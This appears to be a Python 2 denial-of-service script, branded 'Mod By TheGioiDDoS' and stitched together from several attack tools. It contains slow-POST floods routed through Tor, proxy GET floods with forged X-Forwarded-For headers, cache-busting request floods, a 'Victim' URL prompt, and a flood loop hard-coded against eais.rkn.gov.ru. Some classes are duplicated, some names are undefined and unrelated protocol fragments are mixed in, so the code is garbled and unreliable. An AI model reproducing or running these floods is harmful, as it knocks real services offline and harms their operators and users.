        self.__s_packet=self.__s_packet+self.__autonNick
        self.__s_packet=self.__s_packet+self.__registered_login
        self.__s_packet=self.__s_packet+self.__login
        self.__s_packet=self.__s_packet+self.__password
        self.__s_packet=self.__s_packet+self.__nick
        self.__Set_Crc_Packet()
        self.__Create_connection()
        self.__Send()
 
        #print len(self.__s_packet)
        #print self.__s_packet.encode("hex")
    def __Type_2_connect_login(self):
        self.__s_packet="" #empty
        self.__Set_Class_Standard()               #2 bytes
        self.__Set_Type_Login_Request_Part_2()      #2 bytes
 
        self.__session_key=self.__get[172:(172+4)]  #4 bytes
        self.__client_id = self.__get[8:(8+4)]      #4 bytes
 
        self.__Set_Session_Key()
        self.__Set_Client_Id()
        self.__s_packet=self.__s_packet+"\x01\0\0\0"#4 bytes #sequence number
        self.__s_packet=self.__s_packet+"\0\0"      #2 bytes #resend count:0
        self.__s_packet=self.__s_packet+"\0\0"      #2 bytes #fragment number: 0
        self. __Set_Crc_Empty()
        self.__s_packet=self.__s_packet+"\x01\0"    #2 bytes #unknown number
        self.__s_packet=self.__s_packet+"\0"                        #1 bytes #Channel
        self.__s_packet=self.__s_packet+"\0"                        #1 bytes #sub_channel
        self.__Set_Host()
        self.__s_packet=self.__s_packet+"\x02\x00"
        self.__Set_Port()
        self.__Set_Host()
        self.__s_packet=self.__s_packet+"\0"*32+"\0"*32+"\0"*16
        self.__Set_Crc_Packet()
        self.__Send()
 
    def __Type_Ack(self):
        self.__s_packet=""
        self.__Set_Class_Ack()
        self.__s_packet=self.__s_packet+self.__resend
        self.__Set_Session_Key()
        self.__Set_Client_Id()
        self.__s_packet=self.__s_packet+self.__get[12:16]
        print "ACK ACK ACK"
        self.__Send()
 
    def __Type_Ping(self):
        self.__s_packet=""
        self.__Set_Class_Connection()
        self.__Set_Type_Ping()
        self.__Set_Session_Key()
        self.__Set_Client_Id()
        self.__Set_Ping_Sequence_number()
        self.__Set_Crc_Empty()
        self.__Set_Crc_Packet()
        #
        time.sleep(0.5)
        #
        self.__Send()
        #print "PING PING PING"
        return
 
    def testing(self):
        #self.__CrcMirror(0x12345678)
        #print self.__CrcMirrorChar(0x12345678).encode("hex")
        """
           for i in [self.__login,self.__nick,self.__password,
           self.__client,self.__OS]:
               print "#####"
               print (i).encode("hex")
               print i.replace("\0","")
               print len(i)"""
 
    def __Create_connection(self):
        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.__socket.settimeout(1)
       
    def __Send(self):
        try:
            self.__socket.sendto(self.__s_packet,(self.host,self.port))
 
        except socket.error:
            print "error while sending, retrying"
            for i in range(1,5):
                try:
                    self.__socket.sendto(self.__s_packet,(self.host,self.port))
                except socket.error:
                    pass
                finally:
                    return
 
    def __Read(self):
        return self.__socket.recv(5000)
 
    def Init(self):
        try:
            error=0
            self.__get=self.__Read()
            #print "lenght:",len(self.__get)
            #
            if len(self.__get)==0:
                print "len is zero"
                error=1
                raise socket.error
        except socket.error:
            if (time.time()-self.lasterror)<5:
                print "!# Terminal socket error"
                error=1
            else:
                print "!# socket error, retrying "
                self.__get=self.__Read()
                error=0
                self.lasterror=time.time()
                #FIXME: HELP HELP HELP, INF LOOP
        finally:
            self.__Find_Reply()
            return True if error ==0 else False
 
    def __Find_Reply(self):
        header1=self.__get[:2]
        header2=self.__get[2:4]
        if header1 == "\xf4\xbe":
            if header2 == "\x04\x00":
                print "!# Login reply found"
                self.__Type_2_connect_login()
            elif header2 == "\x02\x00":
                print "!# PING found!"
                self.__ping_sequ=self.__get[12:16]
                self.__Type_Ping()
            else:
                pass
 
        elif header1 == "\xf1\xbe":
            print "!# ACK found!"
            #self.__Type_Ack()
            pass
 
        elif header1 == "\xf0\xbe":
            if header2 == "\x08\x00":
                self.__resend=self.__get[16:18]
                self.__Type_Ack()
                self.__resend="\x00\x00"
                self.__Type_Ping()
            elif self.__get[16:18] <> "\0\0":
                self.__resend=self.__get[16:18]
                self.__Type_Ack()
                self.__resend="\x00\x00"
            else:
                self.__Type_Ack()
        else:
            self.__Type_Ack()

class httpPost(Thread):
    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
               
    def _send_http_post(self, pause=10):
        global stop_now
 
        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 900\r\n"
                        "Content-Length: 10000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                        (self.host, random.choice(useragents)))
 
        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits)
            print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))
       
        self.socks.close()
               
    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:    
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                    self.socks.connect((self.host, self.port))
                    print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
                    time.sleep(1)
                    continue
       
            while self.running:
                try:
                    self._send_http_post()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
                        self.socks = socks.socksocket()
                        break
                    time.sleep(0.1)
                    pass
                
				
class httpPost(Thread):
    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
               
    def _send_http_post(self, pause=10):
        global stop_now
 
        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 900\r\n"
                        "Content-Length: 10000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                        (self.host, random.choice(useragents)))
 
        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits)
            print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))
       
        self.socks.close()
               
    def run1(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:    
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                    self.socks.connect((self.host, self.port))
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"DoS Succeded - Host is DOWN!"+ term.NORMAL
                    continue
       
            while self.running:
                try:
                    self._send_http_post()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        self.socks = socks.socksocket()
                        break
                    pass	
							
def randomIp():
    random.seed()
    result = str(random.randint(10000, 700000)) + '.' + str(random.randint(10000, 700000))
    result = result + str(random.randint(10000, 700000)) + '.' + str(random.randint(10000, 700000))
    return result

def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(800, 10000)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
	
def randomUserAgent():
	return random.choice(userAgents)
 
def randomReFerer():
    return random.choice(reFerers)	

def randomKeyWord():
    return random.choice(keyWords) 	
	
def randomuseragents_list():
    return random.choice(useragents)
	
def randomrefer_list():
    return random.choice(referer)
	
def randomkeyword_list():
    return random.choice(keyword)
 
def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(20, 80)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
	
class attacco(threading.Thread):
    def run(self):
        current = x	
 
class attacco(threading.Thread):
    def run(self):
        referer_list()
        current = x						
        
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
        useragent = "User-Agent: " + getUserAgent() + "\r\n"
        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
        #referer   = "Referer: "+ randomReFerer() + randomKeyWord() + url + "?r="+ str(random.randint(10000, 100000)) +  "\r\n"
        #referer   = "Referer: "+ randomReFerer() + randomKeyWord() + "\r\n"
        referer   = "Referer: "+ randomReFerer() + url + "?r="+ str(random.randint(10000, 150000)) +  "\r\n"
        #referer   = "Referer: "+ host_url + "\r\n"
        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
 
        while nload:
            time.sleep(1)
           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(3):
                        a.send(httprequest)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')
								
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def httpcall(url):
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner = "&"
	else:
		param_joiner = "?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', getUserAgent())
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + host + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)

	index = random.randint(0,len(listaproxy)-1)
	proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
	opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
	urllib2.install_opener(opener)	
	try:
			urllib2.urlopen(request)
			if(flag==1): set_flag(0)
			if(code==500): code=0
	except urllib2.HTTPError, e:
			set_flag(1)
			code=500
			time.sleep(60)
	except urllib2.URLError, e:
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)

class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass
			
def randomIp():
    random.seed()
    result = str(random.randint(10000, 254000)) + '.' + str(random.randint(10000, 254000))
    result = result + str(random.randint(10000, 254)) + '.' + str(random.randint(10000, 254000))
    return result

def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(8, 10)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
	
class attacco(threading.Thread):
    def run(self):
    	referer_list()
        current = x
       
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
        useragent = "User-Agent: " + getUserAgent() + "\r\n"
        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
        referer   = "Referer: "+ random.choice(headers_referers) + url + "?r="+ str(random.randint(1, 1500)) +  "\r\n"
        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"

        while nload:
        	time.sleep(1)
        	pass
           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(4):
                        a.send(httprequest)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')

print \
"""
            --------- _       _____   ______    _           _      
            ---  ----! !     ! ____! ! _____!  ! ! _______ ! !
               ! !   ! !____ ! !___  ! !   ___ ! !!  ___  !! !
               ! !   !  __  !! ____! ! !  !___!! !! !   ! !! !  
               ! !   ! !  ! !! !___  ! !____!! ! !! !___! !! !  
               !_!   !_!  !_!!_____! !______!! !_!!_______!!_!DDoS                                         
"""
if os.name in ('nt', 'dos', 'ce'):
    os.system('title       ........::::: Mod By TheGioiDDoS :::::........')
    os.system('color 0a')
Close = False
Lock = threading.Lock()
Request = 999999999999999999999
Tot_req = 9999999999
Port = 80
class Spammer(threading.Thread):

    def __init__(self, url, number):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number

    def run(self):
        global Lock
        global Tot_req
        global Close
        global Request
        Lock.acquire()
        print 'Thread {0} started!'.format(self.num)
        Lock.release()
        while Close == False:
            try:
                urllib.urlopen(self.url)
                Request += 999999999999999999999
                Tot_req += 9
                Port = 80
            except:
                pass

        Lock.acquire()
        print 'Closing thread #{0} started!'.format(self.num)
        Lock.release()
        sys.exit(0)
class extended_thread(Thread):
    PORT = None
    HOST = ''
    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((self.HOST, self.PORT))
            s.listen(1)
            s.settimeout(120)
            conn, addr = s.accept()
            print 'Connected by', addr
            while 1:
                data = conn.recv(1024)
                if not data: break
                conn.sendall(data)
            conn.close()
            server_welcome.socket_success.append(self.PORT)
        except socket.timeout as msg:
            s.close()
            s = None
            print "Socket " + str(self.PORT) + " timed out after two minutes."
            server_welcome.local_socket_exceptions.append(self.PORT)
        except socket.error as msg:
            s.close()
            s = None
            server_welcome.local_socket_exceptions.append(self.PORT)
class handshake():
 
    def __init__(self, ports):
        self.target_port = 60100
        self.received_port_list = []
        self.local_port_list = ports
        self.local_socket_exceptions = []
        self.remote_socket_exceptions = []
        self.socket_success = []
 
    def server_shake(self, payload):
        try:
            if self.target_port <= 60200:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind(('', self.target_port))
                s.listen(1)
                s.settimeout(120)
                conn, addr = s.accept()
                while 1:
                    print "Receiving data..."
                    data = conn.recv(1024)
                    print "sending data..."
                    conn.sendall(str(payload))
                    break
                conn.close()
                return list(data)
            else:
                print "I never heard from the client, or I couldn't secure a port."
        except socket.timeout as msg:
            s.close()
            s = None
            print "Socket " + str(self.target_port) + " timed out after two minutes."
        except socket.error as msg:
            s.close()
            s = None
            self.target_port += 1
            self.server_shake(payload)
   
    def client_shake(self, payload):
        try:
            if self.target_port <= 60200:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((args.host, self.target_port))
                s.settimeout(120)
                print "Sending data..."
                s.sendall(str(payload))
                print "Receiving data..."
                data = s.recv(1024)
                s.close()
                return list(data)
            else:
                print "I never heard from the server, or I couldn't secure a port."
        except socket.timeout as msg:
            s.close()
            s = None
            print "Socket " + str(self.target_port) + " timed out after two minutes."
        except socket.error as msg:
            s.close()
            s = None
            self.target_port += 1
            self.client_shake(payload)
   
    def port_diff(self, local_ports, received_ports):
        return set(local_ports).symmetric_difference_update(set(received_ports))			
def ddos(name):
  try:
    while True:
      baundary=str(random.choice(boundares))
      p="---"+baundary+"\r\n"
      p+="Content-Disposition: form-data; name=\"act\"\r\n\r\n"
      p+="search\r\n"
      p+="---"+baundary+"\r\n"
      p+="Content-Disposition: form-data; name=\"secretcodeId\"\r\n\r\n"
      p+=str(random.choice(blocklist))+"\r\n"
      p+="---"+baundary+"\r\n"
      p+="Content-Disposition: form-data; name=\"searchstring\"\r\n\r\n"
      p+=str(random.choice(blocklist))+"\r\n"
      p+="---"+baundary+"\r\n"
      p+="Content-Disposition: form-data; name=\"secretcodestatus\"\r\n\r\n"
      p+=str(random.choice(codes))+"\r\n"
      rq="POST / HTTP/1.1\r\n"
      rq+="Host: eais.rkn.gov.ru\r\n"
      rq+="Content-Type: multipart/form-data; boundary=---"+baundary+"\r\n"
      rq+="Content-Length: "+str(len(p))+"\r\n"
      rq+="User-Agent: "+str(random.choice(blocklist))+"\r\n"
      rq+="Connection: close\r\n\r\n"+p
      sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      sock.connect(("eais.rkn.gov.ru",80))
      sock.send(rq)
      print "Posting "+name+"..."
      #print sock.recv(2050)
      #sock.close()
  except:
    print "Thread broken. Restarting ..."
    time.sleep(2)
    ddos(name)
def port_forwarder(host, port,loop):
    @asyncio.coroutine
    def forward(local_reader, local_writer):
        client = local_writer.get_extra_info('peername')
        info('connected client %s %s', *client)
        remote_reader, remote_writer = yield asyncio.open_connection(host, port, loop=loop)
        yield asyncio.wait([copy_stream(local_reader, remote_writer),
                                 copy_stream(remote_reader, local_writer)],
                                loop=loop)
        info('disconnected client %s %s', *client)
    return forward	
if __name__ == '__main__':
    try:
        num_threads = input('[#] DAME : ')
        t_tot = input('[#] Time : ')
        port = raw_input('[#] Port : ')
    except:
        t_tot = 2

    timer = t_tot * 600000
    t_tot = t_tot * 600000
    while True:
        url = raw_input('[#] Victim: ')
        try:
            host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
        except IOError:
            print 'Could not open specified url.'
        else:
            break	
	for host in range(int(threads)):
           try:
                   port = sys.argv[2]
           except IndexError:
                  port = random.randint(1,65535)
           at = attack(sys.argv[1], int(port))
           at.start()		
    for i in xrange(num_threads):
        Spammer(url, i + 1).start()	
    for x in xrange(1000):
        t = HTTPThread()
        t.start()
    print '[#] ---------------- '    
    nload = 0
    while not nload:
       time.sleep(1)
    time.sleep(2)
    while timer > 0:
        time.sleep(0.001)
        print 'Request ' + '', timer, '' + '', timer, '' + '', timer, '' + '', timer, '' + '', timer, ''
        Request = 999999999
        timer -= 0.001
    raw_input('> This attack is running........')
    time.sleep(1)
    Close = True
